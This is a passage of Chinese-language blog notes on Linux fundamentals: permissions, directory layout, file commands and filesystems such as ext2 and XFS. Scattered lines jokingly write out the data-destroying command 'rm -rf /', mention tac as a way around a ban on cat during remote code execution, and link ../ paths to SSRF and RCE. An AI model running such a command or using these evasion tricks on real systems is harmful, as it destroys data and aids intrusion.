alt></p><p><code>rwx</code>为三个参数的组合,<code>r</code>代表可读(<strong>read</strong>),<code>w</code>代表可写(<strong>write</strong>),<code>x</code>代表可执行(<strong>execute</strong>)</p><ul><li>r （Read）：可读取此一文件的实际内容，如读取文本文件的文字内容等； </li><li>w （Write）：可以编辑、新增或者是修改该文件的内容（但不含删除该文件）； </li><li>x （eXecute）：该文件具有可以被系统执行的权限。在Linux中一个文件能否被执行,是通过有无”x”这个权限而不是后缀名</li></ul><p><code>chgrp</code>改变文件<strong>所属群组</strong>, <code>chown</code>改变文件<strong>拥有者</strong>, <code>chmod</code>改变文件的<strong>权限</strong></p><p>这些指令都是<code>change+名词</code>的缩写</p><blockquote><p>数字类型改变文件权限</p></blockquote><p><code>r</code>&gt;&gt;4 , <code>w</code>&gt;&gt;2, <code>x</code>&gt;&gt;1</p><p>rwx = 4+2+1 = 7 ,经常会用到的比如 <code>chmod 775 xxx.sh</code></p><p>用符号修改权限. <code>u&gt;user,g&gt;group,o&gt;others,a&gt;all</code></p><p><code>chmod u=rwx,go=rx</code></p><p>目录主要的内容在<strong>记录文件名清单</strong></p><p><img src="https://i.loli.net/2020/01/28/4zkTObWYGmfrjHs.png" alt="目录相应的权限功能"></p><p><code>-</code>指一般文件, <code>d</code>指目录文件</p><p><code>ASCII</code> 纯文本文件,<code>binary</code>二进制档,<code>data</code>数据格式文件</p><p><strong>数据格式文件</strong></p><p>有些程序在运行的过程当中会读取某些特定格式的文件， 那些特定格式的文件可以被称为数据文件 （data file）,比如登录Linux时,<code>/var/log/xxx</code>这个文件就是data file</p><p>目录(directory) , 第一个属性为<code>d</code>;链接文件(link),第一个属性为<code>l</code></p><p>设备与设备文件(device), 与系统周边及储存等相关的一些文件,通常集中在<code>/dev</code>这个目录下,通常又分为两种, <strong>区块</strong>(block)设备文件, 就是一些储存数据,第一个属性为<code>b</code>.</p><p><strong>字符</strong>设备文件, 就是一些串行口的周边设备,如有键盘鼠标等第一个属性为<code>c</code></p><p><strong>数据接口</strong>文件(sockets) 第一个属性为<code>s</code> 最常在<code>/run</code>或<code>tmp</code></p><p><strong>数据输送档</strong>(FIFO,pipe),<strong>FIFO</strong> ,是一种特殊的文件类型,主要的目的在解决多个 程序同时存取一个文件所造成的错误问题。 FIFO是first-in-first-out的缩写。第一个属性为<code>p</code></p><p> Linux文件扩展名, 基本上,Linux的文件是没有所谓的”扩展名”的</p><ul><li>*.sh ： 脚本或批处理文件 （scripts），因为批处理文件为使用shell写成的，所以扩展名 就编成 .sh 啰； </li><li><em>Z,</em> .tar, <em>.tar.gz,</em> .zip, *.tgz： 经过打包的压缩文件。这是因为压缩软件分别为 gunzip, tar 等等的，由于不同的压缩软件，而取其相关的扩展名啰！ </li><li><em>.html,</em> .php：网页相关文件，分别代表 HTML 语法与 PHP 语法的网页文件啰！ .html 的 文件可使用网页浏览器来直接打开，至于 .php 的文件， 则可以通过 client 端的浏览器来 server 端浏览，以得到运算后的网页结果</li></ul><p>Linux<strong>文件长度限制</strong> </p><blockquote><p>单一文件或目录的最大容许文件名为 255Bytes，以一个 ASCII 英文占用一个 Bytes 来 说，则大约可达 255 个字符长度。若是以每个中文字占用 2Bytes 来说， 最大文件名就 是大约在 128 个中文字符</p></blockquote><p><strong>Linux目录配置</strong>的依据 <strong>FHS</strong>, 即Filesystem Hierarchy Standard</p><blockquote><p>主要目的是希望让使用者可以了解到已安装软件通常放 置于那个目录下， 所以他们希望独立的软件开发商、操作系统制作者、以及想要维护系统的使用者,都能够遵循FHS的标准.</p></blockquote><p><img src="https://i.loli.net/2020/01/29/1AjqFaOWl9u2kbB.png" alt></p><p>FHS针对目录树架构仅定义出三层目录下面应该放置什么数据而已</p><ul><li>/ （root, 根目录）：与开机系统有关； </li><li>/usr （unix software resource）：与软件安装/执行有关； </li><li>/var （variable）：与系统运行过程有关。</li></ul><hr><blockquote><p><strong>根目录(/)</strong>的意义与内容</p></blockquote><p>根目录是整个系统最重要的一个目录，因为不但所有的目录都是由根目录衍生出来的,同时根目录也与开机/还原/系统修复等动作有关</p><p>根目录下 FHS <strong>要求必须</strong>存在的目录有: </p><p>即第一层</p><p><code>/bin</code></p><p>/bin放置的是在 单人维护模式下还能够被操作的指令。 在/bin下面的指令可以被root与一般 帐号所使用，主要有：<strong>cat, chmod, chown, date, mv, mkdir, cp, bash</strong>等等常用的指令</p><hr><blockquote><p><strong>/usr</strong> 的意义与内容</p></blockquote><p>依据FHS的基本定义，/usr里面放置的数据属于可分享的与不可变动的（shareable,static）</p><p>第一部分</p><p>usr是<strong>Unix Software Resource</strong>的缩写， 也就 是“Unix操作系统软件资源”所放置的目录,这个目录和Windows系统上的<code>C:\\Windows\+C:\Program files\</code>这两个目录的综合体</p><p><code>/usr/bin/</code></p><blockquote><p>所有一般用户能够使用的<strong>指令</strong>都放在这里.目前新的 CentOS 7 已经将全部的使用者指令放置于此，而使用<strong>链接文件的方式将 /bin 链接至此</strong>也就是说， /usr/bin 与 /bin 是一模一样了.另外，FHS 要求在此目录下不应该有子目录！ </p><p>/usr/lib/与这个目录相似</p></blockquote><p><code>/usr/local/</code></p><blockquote><p>系统管理员在本机自行安装自己下载的软件（非distribution默认提供者），建议安装到此目录,这样会比较便于管理</p></blockquote><p><code>/usr/sbin/</code></p><blockquote><p>非系统正常运行所需要的系统指令。最常见的就是某些网络服务器软件的服务指令（daemon） 基本功能和/sbin 查不到,因此目前 /sbin 就是链接到这个目录中的</p></blockquote><p><code>/usr/share/</code></p><blockquote><p>主要放置只读架构的数据文件,当然也包括共享文件。在这个目录下放 置的数据几乎是不分硬件架构均可读取的数据，因为几乎都是文字文件</p></blockquote><p>第二部分</p><p><code>/usr/games/</code></p><blockquote><p>顾名思义,就是与游戏相关的数据放置的地方</p></blockquote><p><code>/usr/include/</code></p><blockquote><p>c/c++等程序语言的文件开始（header）与包含档（include）放置处,当我们以tarball方式 （*.tar.gz 的方式安装软件）安装某些数据时，会使用到里头的许多包含档</p></blockquote><p><code>/usr/libexec/</code></p><blockquote><p>某些不被一般使用者惯用的可执行文件或脚本（script）等等，都会放置在此目录</p></blockquote><p><code>/usr/src/</code></p><blockquote><p>一般源代码建议放置到这里，src有source的意思。至于核心源代码则建议放置到/usr/src/linux/目录下。 </p></blockquote><hr><blockquote><p><strong>/var</strong> 的意义与内容</p></blockquote><p>为/var目录主要针对常态性变动的文件，包括高速缓存（<strong>cache</strong>）、登录文件 （<strong>log file</strong>）以及某些软件运行所产生的文件， 包括程序文件（lock file, run file），或者例如 MySQL数据库的文件等</p><p>第一部分</p><p><code>/var/cache/</code></p><blockquote><p>应用程序本身运行过程中会产生的一些暂存盘</p></blockquote><p><code>/var/lib/</code></p><blockquote><p>程序本身执行的过程中，需要使用到的数据文件放置的目录;举例来说，MySQL的数据库放置到/var/lib/mysql/而rpm的数据库则放到/var/lib/rpm</p></blockquote><p><code>/var/lock/</code></p><blockquote><p>某些设备或者是文件资源一次只能被一个应用程序所使用，如果同时有两个程序使用该设备时，就可能产生一些错误的状况，因此就得要将该设备上锁（lock）以确保该设备只会给单一软件所使用</p></blockquote><p><code>/var/log/</code></p><blockquote><p>比较重要的文件如/var/log/messages, /var/log/wtmp（记录登陆者的信息）</p><p>文件包含的时候都会用到</p></blockquote><p><code>/var/mail/</code></p><blockquote><p>放置个人电子邮件信箱的目录,不过这个目录也被放置到/var/spool/mail/ 目录中,通常这两个目录是互为链接文件啦</p></blockquote><p><code>/var/run/</code></p><blockquote><p>某些程序或者是服务启动后，会将他们的PID放置在这个目录下</p></blockquote><p>PID 后面章节才会学习到</p><p><code>/var/spool/</code></p><blockquote><p>通常放置一些伫列数据，所谓的“伫列”就是排队等待其他程序使用的数据,这些数据被使用后通常都会被删除</p></blockquote><p>CentOS 7 在目录编排上发生的变化, 采用 链接设置</p><ul><li>/bin –&gt; /usr/bin </li><li>/sbin –&gt; /usr/sbin </li><li>/lib –&gt; /usr/lib </li><li>/lib64 –&gt; /usr/lib64 </li><li>/var/lock –&gt; /run/lock </li><li>/var/run –&gt; /run </li></ul><hr><blockquote><p><strong>目录树(directory tree)</strong></p></blockquote><p>在Linux下面，所有的文件与目录都是由根目录开始的,然后再一个一个的分支下来</p><p>因此称这种目录配置方式为: “目录树”</p><p>主要特性有</p><ul><li>目录树的启始点为根目录 （/, root）</li><li>每一个目录不止能使用本地端的 partition 的文件系统，也可以使用网络上的 filesystem .举例来说， 可以利用 Network File System （NFS） 服务器挂载某特定目录等</li><li>每一个文件在此目录树中的文件名（包含完整路径）都是独一无二的</li></ul><p><img src="https://i.loli.net/2020/01/29/owgVvtjFEkKuA3q.png" alt="目录树架构"></p><hr><blockquote><p><strong>绝对路径与相对路径</strong>(Linux系统中)</p></blockquote><p>根据文件名写法的不同，也可将所谓的路径（path）定义为绝对路径（absolute）与相对路径 (relative)</p><ul><li>绝对路径：由<strong>根目录（/）开始写起</strong>的文件名或目录名称， 例如/home/dmtsai/.bashrc； </li><li>相对路径：相<strong>对于目前路径</strong>的文件名写法。 例如 ./home/dmtsai 或 ../../home/dmtsai/ 等等。反正开头不是 / 就属于相对路径的写法</li></ul><blockquote><p>. ：代表当前的目录，也可以使用 ./ 来表示</p><p>.. ：代表上一层目录，也可以 ../ 来代表</p><p>这个在SSRF,RCE中,或者其他地方经常用到</p></blockquote><p>(<a href="https://i.loli.net/2020/01/29/ZwrnDVotP6FbgJX.png" target="_blank" rel="noopener">https://i.loli.net/2020/01/29/ZwrnDVotP6FbgJX.png</a>)</p><h1 id="0x06-Linux-文件与目录管理"><a href="#0x06-Linux-文件与目录管理" class="headerlink" title="0x06    Linux 文件与目录管理"></a>0x06    Linux 文件与目录管理</h1><blockquote><p>目录的相关操作</p></blockquote><ul><li>. 代表此层目录 </li><li>.. 代表上一层目录 </li><li>- 代表前一个工作目录 </li><li>~ 代表“目前使用者身份”所在的主文件夹 </li><li>~account 代表 account 这个使用者的主文件夹（account是个帐号名称） </li></ul><blockquote><p>处理目录的指令</p></blockquote><ul><li>cd : 变换目录(change directory)</li><li>pwd: 显示目前的目录(Print Working Directory)</li><li>mkdir: 创建一个新的目录(make directory)</li><li>rmdir: 删除一个空的目录</li></ul><p><code>~</code>代表个人的主文件夹</p><blockquote><p>可执行文件路径的变量: $PATH</p></blockquote><p>使用<code>echo $PATH</code></p><p>添加$PATH, <code>PATH=&quot;${PATH}:/root&quot;</code> 表示,将/root加入到PATH当中</p><p><code>ls</code>(list的缩写),检视文件与目录,<code>cp</code>复制,<code>rm</code>删除,<code>mv</code>移动,分别是(copy),(remove),(move)的缩写</p><p>实际情况下,不知道怎么用了就可以使用 <code>man</code> 或者<code>--help</code></p><p><code>cp</code></p><blockquote><p>-a ：相当于 -dr –preserve=all 的意思，至于 dr 请参考下列说明；（常用） </p><p>-d ：若来源文件为链接文件的属性（link file），则复制链接文件属性而非文件本身； </p><p>-f ：为强制（force）的意思，若目标文件已经存在且无法打开，则移除后再尝试一次； </p><p>-i ：若目标文件（destination）已经存在时，在覆盖时会先询问动作的进行（常用） </p><p>-l ：进行硬式链接（hard link）的链接文件创建，而非复制文件本身； </p><p>-p ：连同文件的属性（权限、用户、时间）一起复制过去，而非使用默认属性（备份常用）； </p><p>-r ：递回持续复制，用于目录的复制行为；（常用） </p><p>-s ：复制成为符号链接文件 （symbolic link），亦即“捷径”文件； </p><p>-u ：destination 比 source 旧才更新 destination，或 destination 不存在的情况下才复制。 </p><p>–preserve=all ：除了 -p 的权限相关参数外，还加入 SELinux 的属性, links, xattr 等也复制了。 </p><p>最后需要注意的，如果来源文件有两个以上，则最后一个目的文件一定要是“目录”才行！ </p></blockquote><p><code>rm</code></p><blockquote><p>-f ：就是 force 的意思，忽略不存在的文件，不会出现警告讯息； </p><p>-i ：互动模式，在删除前会询问使用者是否动作 </p><p>-r ：递回删除啊！最常用在目录的删除了.这是非常危险的选项,例如 rm -rf / 哈哈</p></blockquote><p><code>mv</code></p><blockquote><p>-f ：force 强制的意思，如果目标文件已经存在，不会询问而直接覆盖</p><p>-i ：若目标文件 （destination） 已经存在时，就会询问是否覆盖</p><p>-u ：若目标文件已经存在，且 source 比较新，才会更新 （update） </p></blockquote><hr><blockquote><p><strong>取得路径的文件名称与目录名称</strong></p></blockquote><p>每个文件的完整文件名包含了前面的目录与最终的文件名，而每个文件名的长度都可以到达255 个字符</p><p><code>basename</code></p><p>取得最后的文件名</p><p><code>dirname</code></p><p>取得的目录名</p><hr><blockquote><p><strong>文件内容查阅</strong></p></blockquote><ul><li>cat 由第一行开始显示文件内容 </li><li>tac 从最后一行开始显示，可以看出 tac 是 cat 的倒着写</li><li>nl 显示的时候，顺道输出行号</li><li>more 一页一页的显示文件内容 </li><li>less 与 more 类似，但是比 more 更好的是，他可以往前翻页</li><li>head 只看头几行 </li><li>tail 只看尾巴几行 </li><li>od 以二进制的方式读取文件内容</li></ul><hr><blockquote><p><strong>直接检视文件内容</strong></p></blockquote><p><code>cat(concatenate)</code></p><ul><li>-A ：相当于 -vET 的整合选项，可列出一些特殊字符而不是空白而已； </li><li>-b ：列出行号，仅针对非空白行做行号显示，空白行不标行号！ </li><li>-E ：将结尾的断行字符 $ 显示出来； </li><li>-n ：打印出行号，连同空白行也会有行号，与 -b 的选项不同； </li><li>-T ：将 [tab] 按键以 ^I 显示出来； </li><li>-v ：列出一些看不出来的特殊字符</li></ul><p><code>tac</code>(<strong>反向读取</strong>),这个在<strong>RCE中ban掉了cat等的时候会用到</strong></p><p><code>nl</code>(添加行号打印)</p><ul><li>-b ：指定行号指定的方式，主要有两种： -b a ：表示不论是否为空行，也同样列出行号（类似 cat -n）； -b t ：如果有空行，空的那一行不要列出行号（默认值）； </li><li>-n ：列出行号表示的方法，主要有三种： -n ln ：行号在屏幕的最左方显示； -n rn ：行号在自己字段的最右方显示，且不加 0 ； -n rz ：行号在自己字段的最右方显示，且加 0 ； </li><li>-w ：行号字段的占用的字符数。 </li></ul><hr><blockquote><p><strong>可翻页检视</strong></p></blockquote><p><code>more</code>(只能向后翻)</p><ul><li>空白键 （space）：代表向下翻一页； </li><li>Enter ：代表向下翻“一行”； </li><li>/字串 ：代表在这个显示的内容当中，向下搜寻“字串”这个关键字； </li><li>:f ：立刻显示出文件名以及目前显示的行数； </li><li>q ：代表立刻离开 more ，不再显示该文件内容。 </li><li>b 或 [ctrl]-b ：代表往回翻页，不过这动作只对文件有用，对管线无用。</li></ul><p><code>less</code></p><ul><li>[pagedown]：向下翻动一页； </li><li>[pageup] ：向上翻动一页； </li><li>/字串 ：向下搜寻“字串”的功能； </li><li>?字串 ：向上搜寻“字串”的功能； </li><li>n ：重复前一个搜寻 （与 / 或 ? 有关！） </li><li>N ：反向的重复前一个搜寻 （与 / 或 ? 有关！） </li><li>g ：前进到这个数据的第一行去； </li><li>G ：前进到这个数据的最后一行去 （注意大小写）； </li><li>q ：离开 less 这个程序； </li></ul><hr><blockquote><p><strong>修改文件时间或者创建新文件</strong></p></blockquote><p><code>touch</code></p><p>Linux下主要有三个变动时间</p><ul><li><strong>modification time</strong> （<strong>mtime</strong>）： 当该文件的“内容数据”变更时，就会更新这个时间！内 容数据指的是文件的内容，而不是文件的属性或权限</li><li><strong>status time</strong> （<strong>ctime</strong>）： 当该文件的“状态 （status）”改变时，就会更新这个时间，举 例来说，像是权限与属性被更改了，都会更新这个时间啊。 </li><li><strong>access time</strong> （<strong>atime</strong>）： 当“该文件的内容被取用”时，就会更新这个读取时间 （access）。举例来说，我们使用 cat 去读取 /etc/man_db.conf ， 就会更新该文件的 atime 了</li></ul><p>默认显示mtime</p><p>touch最常使用的情况</p><ul><li>创建一个空的文件； </li><li>将某个文件日期修订为目前 （mtime 与 atime）  </li></ul><hr><blockquote><p><strong>文件与目录的默认权限与隐藏权限</strong></p></blockquote><p>除了基本r, w, x权限外，在Linux传统的Ext2/Ext3/Ext4文件系统下，我们还可以设置其他的系 统隐藏属性， 这部份可使用 <strong>chattr</strong> 来设置，而以 <strong>lsattr</strong> 来查看，最重要的属性就是可以<strong>设置其不可修改的特性</strong></p><blockquote><p><strong>文件默认权限</strong> :umask</p></blockquote><p>umask 的分数指的是,该默认值需要减掉的权限</p><ul><li>若使用者创建为“文件”则默认“没有可执行（ x ）权限”，亦即只有 rw 这两个项目，也就是最大为 666 分，默认权限如下： -rw-rw-rw- </li><li>若使用者创建为“目录”，则由于 x 与是否可以进入此目录有关，因此默认为所有权限均开放，亦即为 777 分，默认权限如下： drwxrwxrwx</li></ul><p>root 的 umask 默认是 022 </p><blockquote><p><strong>文件隐藏属性</strong></p></blockquote><p><code>chattr</code> 设置文件隐藏属性</p><ul><li>+ ：增加某一个特殊参数，其他原本存在参数则不动。 </li><li>- ：移除某一个特殊参数，其他原本存在参数则不动。 </li><li>= ：设置一定，且仅有后面接的参数 </li><li>A ：当设置了 A 这个属性时，若你有存取此文件（或目录）时，他的存取时间 atime 将不会被修改，可避免 I/O 较慢的机器过度的存取磁盘。（目前建议使用文件系统挂载参数处理这个项目） </li><li>S ：一般文件是非同步写入磁盘的（原理请参考<a href="../Text/index.html#sync">前一章sync</a>的说明），如果加上 S 这个属性时，当你进行任何文件的修改，该更动会“同步”写入磁盘中。 </li><li>a ：当设置 a 之后，这个文件将只能增加数据，而不能删除也不能修改数据，只有root 才能设置这属性 </li><li>c ：这个属性设置之后，将会自动的将此文件“压缩”，在读取的时候将会自动解压缩,但是在储存的时候，将会先进行压缩后再储存（对于大文件似乎蛮有用的） </li><li>d ：当 dump 程序被执行的时候，设置 d 属性将可使该文件（或目录）不会被 dump 备份 </li><li>i ：这个 i 可就很厉害了！他可以让一个文件“不能被删除、改名、设置链接也无法写入或新增数据！” 对于系统安全性有相当大的助益！只有 root 能设置此属性 </li><li>s ：当文件设置了 s 属性时，如果这个文件被删除,他将会被完全的移除出这个硬盘空间，所以如果误删了,完全无法救回来了 </li><li>u ：与 s 相反的，当使用 u 来设置文件时，如果该文件被删除了，则数据内容其实还存在磁盘中,可以使用来救援该文件</li></ul><p><strong>最重要的当属 +i 与 +a 这个属性, +i让一个文件无法被改动,+a 可以增加但是不能修改原来的参数</strong></p><p><code>lsattr</code> 显示文件隐藏属性</p><ul><li>-a ：将隐藏文件的属性也秀出来</li><li>-d ：如果接的是目录，仅列出目录本身的属性而非目录内的文件名</li><li>-R ：连同子目录的数据也一并列出来</li></ul><blockquote><p><strong>文件特殊权限</strong></p></blockquote><p><strong>SUID, SGID, SBIT</strong></p><p><code>Set UID</code>,简称 SUID 的特殊权限</p><ul><li>SUID 权限仅对二进制程序（binary program）有效</li><li>执行者对于该程序需要具有 x 的可执行权限 </li><li>本权限仅在执行该程序的过程中有效 （run-time） </li><li>执行者将具有该程序拥有者 （owner） 的权限</li></ul><p><code>Set GID</code></p><p>当 s 标志在文件拥有者的 x 项目为 SUID，那 s 在群组的 x 时则称为 Set GID</p><p>与 SUID 不同的是<strong>，SGID 可以针对文件或目录来设置</strong></p><ul><li>SGID 对二进制程序有用</li><li>程序执行者对于该程序来说,需要X权限</li><li>执行者在执行的过程中将会获得该程序群组的支持</li></ul><p>当目录设置了SGID 的权限后,</p><ul><li>使用者若对于此目录具有 r 与 x 的权限时，该使用者能够进入此目录； </li><li>使用者在此目录下的有效群组（effective group）将会变成该目录的群组； </li><li>用途：若使用者在此目录下具有 w 的权限（可以新建文件），则使用者所创建的新文件，该新文件的群组与此目录的群组相同</li></ul><p><code>Sticky Bit</code></p><p>个 Sticky Bit, SBIT 目前只针对目录有效，对于文件已经没有效果了</p><ul><li>当使用者对于此目录具有 w, x 权限，亦即具有写入的权限时； </li><li>当使用者在该目录下创建文件或目录时，<strong>仅有自己与 root 才有权力删除该文件</strong></li></ul><blockquote><p><strong>SUID/SGID/SBIT 权限设置</strong></p></blockquote><ul><li>4 &gt;&gt; SUID</li><li>2 &gt;&gt; SGID</li><li>1 &gt;&gt; SBIT</li></ul><p>例如 :    <code>chmod 4755 filename</code> 即在原来的755前面加上4</p><p><strong>SUID 为 u+s ，而 SGID 为 g+s ， SBIT 则是 o+t</strong> </p><hr><blockquote><p><strong>观察文件类型: file</strong></p></blockquote><pre><code>root@ifonlys-kali:~# file /etc/passwd/etc/passwd: ASCII text</code></pre><hr><blockquote><p><code>which</code> (寻找”可执行文件”)</p></blockquote><pre><code>which [-a] command</code></pre><p>-a ：将所有由 PATH 目录中可以找到的指令均列出，而不止第一个被找到的指令名称</p><pre><code>root@ifonlys-kali:~# which ifconfig/usr/sbin/ifconfig</code></pre><p>这个指令是故居”PATH”这个环境变量所规范的路径,去搜寻”可执行文件”的文件名</p><blockquote><p><strong>文件文件名的搜寻</strong></p></blockquote><p><code>whereis</code>(由一些特定的目录中寻找文件文件名)</p><ul><li>-l :可以列出 whereis 会去查询的几个主要目录而已 </li><li>-b :只找 binary 格式的文件 </li><li>-m :只找在说明文档 manual 路径下的文件 </li><li>-s :只找 source 来源文件 </li><li>-u :搜寻不在上述三个项目当中的其他特殊文件</li></ul><pre><code>root@ifonlys-kali:~# whereis ifconfigifconfig: /usr/sbin/ifconfig /usr/share/man/man8/ifconfig.8.gz</code></pre><p>会把全部的文件名都列出来了</p><p><strong>whereis 主要是针对 /bin /sbin 下面的可执行文件， 以及 /usr/share/man 下面的 man page 文件，跟几个比较特定的目录来处理而已,故速度更快</strong></p><p><code>locate/ updatedb</code></p><ul><li>-i ：忽略大小写的差异； </li><li>-c ：不输出文件名，仅计算找到的文件数量 </li><li>-l ：仅输出几行的意思，例如输出五行则是 -l 5 </li><li>-S ：输出 locate 所使用的数据库文件的相关信息，包括该数据库纪录的文件/目录数量等 </li><li>-r ：后面可接正则表达式的显示方式 </li></ul><p>locate的使用非常简单,直接在后面输入”文件的部分名称”,就能得到结果</p><p>因为 locate 寻找的数据是由“已创建的数据库 <strong>/var/lib/mlocate/</strong>里面的数据所搜寻到的,故速度较快</p><p>使用<code>updatedb</code> 手动更新<code>locate</code>数据库,updatedb 指令会去读取 /etc/updatedb.conf 这个配置文件的设置，然 后再去硬盘里面进行搜寻文件名的动作， 最后就更新整个数据库文件 ,因为会去搜寻硬盘,速度较慢</p><ul><li>updatedb：根据 /etc/updatedb.conf 的设置去搜寻系统硬盘内的文件名，并更新/var/lib/mlocate 内的数据库文件； </li><li>locate：依据 /var/lib/mlocate 内的数据库记载，找出使用者输入的关键字文件名。</li></ul><p><code>find</code></p><p>因为find在寻找数据的时候是在硬盘中搜寻,故没事不要用find</p><hr><blockquote><p><strong>权限与指令间的关系</strong> </p></blockquote><p>1)使用者能进入某目录成为”可工作目录”的基本权限</p><ul><li>可使用的指令：例如 cd 等变换工作目录的指令； </li><li>目录所需权限：使用者对这个目录至少需要具有 x 的权限 </li><li>额外需求：如果使用者想要在这个目录内利用 ls 查阅文件名，则使用者对此目录还需要 r的权限。 </li></ul><p>2)使用者在某个目录内读取一个文件的基本权限</p><ul><li>可使用的指令：例如本章谈到的 cat, more, less等等 </li><li>目录所需权限：使用者对这个目录至少需要具有 x 权限； </li><li>文件所需权限：使用者对文件至少需要具有 r 的权限才行</li></ul><p>3)使用者可以修改一个文件的基本权限</p><ul><li>可使用的指令：例如 nano 或未来要介绍的 vi 编辑器等； </li><li>目录所需权限：使用者在该文件所在的目录至少要有 x 权限； </li><li>文件所需权限：使用者对该文件至少要有 r, w 权限</li></ul><p>4)使用者可以创建一个文件的基本权限</p><ul><li>目录所需权限：使用者在该目录要具有 w,x 的权限，重点在 w</li></ul><p>5)使用者进入某目录并执行该目录下的某个指令的基本权限</p><ul><li>目录所需权限：使用者在该目录至少要有 x 的权限</li><li>文件所需权限：使用者在该文件至少需要有 x 的权限</li></ul><p><img src="https://i.loli.net/2020/01/29/iML9nwGdmAPFva3.png" alt="第六章重点"></p><h1 id="0x07-Linux-磁盘与文件系统管理"><a href="#0x07-Linux-磁盘与文件系统管理" class="headerlink" title="0x07    Linux 磁盘与文件系统管理"></a>0x07    Linux 磁盘与文件系统管理</h1><p>每种操作系统能够使用的文件系统并不相同.windows 98 以前的微软操作系统主要利用的文件系统是 FAT （或 FAT16），windows 2000 以后的版本 有所谓的 NTFS 文件系统，至于 Linux 的正统文件系统则为 Ext2 （Linux second extended file system, ext2fs）这一个。此外，在默认的情况下，windows 操作系统是不会认识 Linux的 Ext2 的</p><ul><li><p>superblock：记录此 filesystem 的整体信息，包括inode/block的总量、使用量、剩余量,以及文件系统的格式与相关信息等</p></li><li><p>inode：记录<strong>文件的属性</strong>，一个文件占用一个inode，同时记录此文件的数据所在的 block号码</p></li><li><p>block：实际记录<strong>文件的内容</strong>，若文件太大时，会占用多个 block</p></li></ul><p><img src="https://i.loli.net/2020/01/29/M5vZDWuXn849EJN.png" alt="inode/block"></p><p>上面这种数据存取的方法称为索引式文件系统(indexed allocation)</p><p><strong>所谓磁盘重组,因就是文件写入的 block 太过于离散了，</strong> </p><p><strong>此时文件读取的性能将会变的很差所致</strong>这个时候可以通过磁盘重组<strong>将同一个文件所属的 blocks 汇整在一起</strong>，这样数据的读取会比较容易</p><blockquote><p>由于 Ext2 是索引式文件系统，基本上不太需要常常进行磁盘重组</p></blockquote><p><img src="https://i.loli.net/2020/01/29/ASH5s83cMvR9gDt.png" alt></p><p>文件系统最前面有一个开机扇区(boot sector),可以安装开机管理程序</p><p><code>data block</code>(数据区块)</p><blockquote><p>data block 是用来放置文件内容数据地方，在 Ext2 文件系统中所支持的 block 大小有 1K, 2K及 4K 三种</p></blockquote><p><code>inode table</code> </p><p>inode 记录的文件数据至少有下面这些</p><ul><li><p>该文件的存取模式（read/write/excute）</p></li><li><p>该文件的拥有者与群组（owner/group）</p></li><li><p>该文件的容量</p></li><li><p>该文件创建或状态改变的时间（ctime）</p></li><li><p>最近一次的读取时间（atime）</p></li><li><p>最近修改的时间（mtime）</p></li><li><p>定义文件特性的旗标（flag），如 SetUID…</p></li><li><p>该文件真正内容的指向 （pointer</p></li><li><p>每个 inode 大小均固定为 128 Bytes （新的 ext4 与 xfs 可设置到 256 Bytes）； </p></li><li><p>每个文件都仅会占用一个 inode 而已； </p></li><li><p>承上，因此文件系统能够创建的文件数量与 inode 的数量有关； </p></li><li><p>系统读取文件时需要先找到 inode，并分析 inode 所记录的权限与使用者是否符合，若符 合才能够开始实际读取 block 的内容</p></li></ul><p><code>Superblock</code> (超级区块)</p><p>Superblock 是记录整个 filesystem 相关信息的地方， 没有 Superblock ，就没有这个filesystem .记录的信息有</p><ul><li>block 与 inode 的总量； </li><li>未使用与已使用的 inode / block 数量； </li><li>block 与 inode 的大小 （block 为 1, 2, 4K，inode 为 128Bytes 或 256Bytes）； </li><li>filesystem 的挂载时间、最近一次写入数据的时间、最近一次检验磁盘 （fsck） 的时间 等文件系统的相关信息； </li><li>一个 valid bit 数值，若此文件系统已被挂载，则 valid bit 为 0 .若未被挂载，则 valid bit 为 1 </li></ul><p><strong>Filesystem Description</strong>(文件系统描述说明)</p><p>这个区段可以描述每个 block group 的开始与结束的 block 号码，以及说明每个区段 （superblock, bitmap, inodemap, data block） 分别介于哪一个 block 号码之间</p><p><strong>block bitmap</strong>(区块对照表)</p><p><strong>inode bitmap</strong>(inode 对照表),记录使用与未使用的inode号码</p><p><strong>dumpe2fs</strong> (查询 Ext 家族 superblock 信息的指令)</p><hr><p>挂载点的意义( <strong>mount point</strong>)<br><strong>文件系统与目录树结合</strong>的动作我们称为“挂载”,挂载点一定是目录,该目录为进入该文件系统的入口.因此并不是任何文件系统都能使用,必须要”挂载”到目录树的某个目录后,才能使用该文件系统</p><p>XFS 文件系统在数据的分布上,主要规划为三个部份 , 一个数据区(data section) , 一个文件系统活动登录区(log section), 和一个实时运行区(realtime section)</p><p><code>数据区</code>和之前的ext家族一样</p><p><code>log section</code></p><p>在登录区这个区域主要被用来纪录文件系统的变化，其实有点像是日志区.文件的变化会在这里纪录下来，直到该变化完整的写入到数据区后， 该笔纪录才会被终结</p><p><code>realtime section</code></p><p>当有文件要被创建时，xfs 会在这个区段里面找一个到数个的 extent 区块，将文件放置在这个区块内，等到分配完毕后，再写入到 data section 的 inode 与 block 去</p><p><code>df</code>列出文件系统的整体磁盘使用量</p><ul><li>-a ：列出所有的文件系统，包括系统特有的 /proc 等文件系统； </li><li>-k ：以 KBytes 的容量显示各文件系统； </li><li>-m ：以 MBytes 的容量显示各文件系统； </li><li>-h ：以<strong>人们较易阅读的 GBytes, MBytes, KBytes 等</strong>格式自行显示； </li><li>-H ：以 M=1000K 取代 M=1024K 的进位方式； </li><li>-T ：连同该 partition 的 filesystem 名称 （例如 xfs） 也列出； </li><li>-i ：不用磁盘容量，而以 inode 的数量来显示 </li></ul><p><code>du</code>评估文件系统的磁盘使用量(常用在评估目录所占容量)</p><ul><li>-a ：列出所有的文件与目录容量，因为默认仅统计目录下面的文件量而已。 </li><li>-h ：以人们较易读的容量格式 （G/M） 显示； </li><li>-s ：列出总量而已，而不列出每个各别的目录占用容量； </li><li>-S ：不包括子目录下的总计，与 -s 有点差别。 </li><li>-k ：以 KBytes 列出容量显示； </li><li>-m ：以 MBytes 列出容量显示；</li></ul><hr><blockquote><p>实体链接与符号链接  <strong>ln</strong></p></blockquote><p><strong>Hard Link</strong>( 实体链接, 硬式链接或实际链接)</p><p>hard link 只是在某个目录下新增一笔文件名链接到某 inode 号码的关连记录而已</p><p><img src="https://i.loli.net/2020/01/29/4sQ5C6lxTVAj7nZ.png" alt></p><p><strong>hard link 的限制</strong></p><ul><li>不能跨 Filesystem</li><li>不能 link 目录</li></ul><p><strong>Symbolic Link</strong> (符号链接, 也就是捷径)</p><p> Symbolic link 就是在<strong>创建一个独立的文件</strong>，而这个文件会让<strong>数据的读取指向他 link 